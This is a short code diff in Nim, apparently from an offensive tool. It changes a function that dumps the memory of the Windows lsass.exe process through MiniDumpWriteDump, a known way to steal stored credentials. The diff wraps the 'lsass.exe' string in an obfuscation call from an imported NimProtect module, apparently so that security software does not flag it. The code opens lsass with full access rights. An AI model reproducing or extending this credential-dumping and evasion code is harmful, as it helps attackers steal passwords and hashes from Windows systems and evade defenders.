@@ -1,5 +1,6 @@
 import helpers
 import winim
+import NimProtect
 
 proc MiniDumpWriteDump(
     process_handle: HANDLE,
@@ -14,7 +15,7 @@ proc MiniDumpWriteDump(
 
 proc dump_lsass_minidumpwritedump*(): bool =
     var is_success = false
-    let pid = get_pid("lsass.exe")
+    let pid = get_pid(protectString("lsass.exe"))
     if not bool(pid):
         return is_success
     var process_handle = OpenProcess(PROCESS_ALL_ACCESS, false, cast[DWORD](pid))
